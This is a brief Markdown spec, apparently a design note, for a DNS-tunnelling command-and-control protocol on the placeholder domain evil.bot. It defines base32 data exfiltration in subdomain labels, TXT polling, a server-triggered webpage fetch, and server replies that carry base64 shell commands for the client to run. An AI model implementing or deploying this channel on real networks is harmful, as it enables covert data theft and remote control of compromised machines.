# Domain

evil.bot

# CLIENT -> SERVER

## ENCODING

- Data: Base32 in subdomain
  - The whole data block is one base32 String (minimum padding)
- Commands: Plaintext
- ClientID: Plaintext


### END OF MESSAGE

- 0.[...].evil.bot

## MESSAGE

### A
#### Request ID

- Polling ohne id
- requestid.evil.bot

#### Data
- send data to server

##### Head
- \<base32>\<data>.[...].\<base32>\<data>.head.data.\<ClientID>.evil.bot
- 0.\<base32>\<data>.[...].\<base32>\<data>.head.data.\<ClientID>.evil.bot
  - optional: body request signals end of head

#### Body

- \<base32>\<data>.[...].\<base32>\<data>.body.data.\<ClientID>.evil.bot
- 0.\<base32>\<data>.[...].\<base32>\<data>.body.data.\<ClientID>.evil.bot

### TXT

#### Poll

- polling
- poll.\<ClientID>.evil.bot

#### Continue

- continue data transmission
- continue.\<ClientID>.evil.bot

#### Curl

- curl a webpage
- 0.\<base32>\<webpage>.[...].\<base32>\<webpage>.curl.\<ClientID>.evil.bot


## SEQUENCE DIAGRAM


# SERVER -> CLIENT

## ENCODING

- TXT data is base64 encoded (except for the command and the space after it)

## RESPONSES

### A

#### Request ID

- 10.\<random>.\<random>.\<ClientID>

#### Data

- \<random != 10>.\<random>.\<random>.\<random>

### TXT

#### Poll

##### Noting

- NOTHING

##### Data

- DATA\<space>\<base64>\<data>

##### shell command

- SHELL\<space>\<base64>\<command>


#### Continue

##### Noting

- NOTHING

##### Data

- \<base64>\<data>

##### shell command

- \<base64>\<command>

## SEQUENCE DIAGRAM